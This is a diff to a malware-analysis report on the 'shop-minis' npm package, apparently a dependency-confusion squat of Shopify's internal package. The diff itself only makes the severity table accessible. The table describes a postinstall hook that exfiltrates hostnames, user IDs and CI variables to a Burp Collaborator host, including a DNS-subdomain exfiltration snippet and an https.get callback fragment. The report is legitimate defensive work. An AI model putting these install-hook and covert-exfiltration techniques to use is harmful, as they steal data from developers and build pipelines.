@@ -36,17 +36,17 @@ https.<span class="tok-fn">get</span>({ host: CALLBACK_HOST, path, timeout: <spa
 
 ## Traits observed
 
-|  | Trait | What it caught |
+| <span class="visually-hidden">Severity</span> | Trait | What it caught |
 | --- | --- | --- |
-| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/dependency-confusion/namespace-squat` | Public unscoped `shop-minis` shadowing Shopify's internal Shop Minis package |
-| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/recon-exfil/install-hook` | `postinstall` fires `node postinstall.js` and exfils on every install |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/recon-exfil/pipeline` | Collects `CI` and `GITHUB_REPOSITORY` from the runner's environment |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/exfiltration/covert-channel/dns/subdomain-label` | `dns.lookup(\`${whoami}.<burp>\`)` leaks identity past HTTPS egress blocks |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/command-and-control/infrastructure/burp-collaborator` | C2 host is a Burp Collaborator subdomain on `oastify.com` |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/exfiltration/sensitive-data/javascript/js-system-info-exfiltration` | `whoami`, `id`, `hostname`, `platform`, `cwd` shipped as URL params |
-| <span class="sev-dot notable" title="notable"></span> | `objectives/discovery/system/fingerprint/runtime` | `whoami` / `id` via `execSync` plus `os.hostname()`, `os.platform()` |
-| <span class="sev-dot notable" title="notable"></span> | `metadata/package/fields/bin` | Declared `bin: discovery-build` alongside the `postinstall` trigger |
-| <span class="sev-dot notable" title="notable"></span> | `objectives/supply-chain/metadata-anomaly/package/npm` | Self-described "Security research canary — shopify", one-line `Takeover By lobo` readme, no repository URL |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `objectives/supply-chain/dependency-confusion/namespace-squat` | Public unscoped `shop-minis` shadowing Shopify's internal Shop Minis package |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `objectives/supply-chain/recon-exfil/install-hook` | `postinstall` fires `node postinstall.js` and exfils on every install |
+| <span class="sev-dot suspicious" aria-hidden="true"></span>suspicious | `objectives/supply-chain/recon-exfil/pipeline` | Collects `CI` and `GITHUB_REPOSITORY` from the runner's environment |
+| <span class="sev-dot suspicious" aria-hidden="true"></span>suspicious | `objectives/exfiltration/covert-channel/dns/subdomain-label` | `dns.lookup(\`${whoami}.<burp>\`)` leaks identity past HTTPS egress blocks |
+| <span class="sev-dot suspicious" aria-hidden="true"></span>suspicious | `objectives/command-and-control/infrastructure/burp-collaborator` | C2 host is a Burp Collaborator subdomain on `oastify.com` |
+| <span class="sev-dot suspicious" aria-hidden="true"></span>suspicious | `objectives/exfiltration/sensitive-data/javascript/js-system-info-exfiltration` | `whoami`, `id`, `hostname`, `platform`, `cwd` shipped as URL params |
+| <span class="sev-dot notable" aria-hidden="true"></span>notable | `objectives/discovery/system/fingerprint/runtime` | `whoami` / `id` via `execSync` plus `os.hostname()`, `os.platform()` |
+| <span class="sev-dot notable" aria-hidden="true"></span>notable | `metadata/package/fields/bin` | Declared `bin: discovery-build` alongside the `postinstall` trigger |
+| <span class="sev-dot notable" aria-hidden="true"></span>notable | `objectives/supply-chain/metadata-anomaly/package/npm` | Self-described "Security research canary — shopify", one-line `Takeover By lobo` readme, no repository URL |
 
 ## Indicators
 
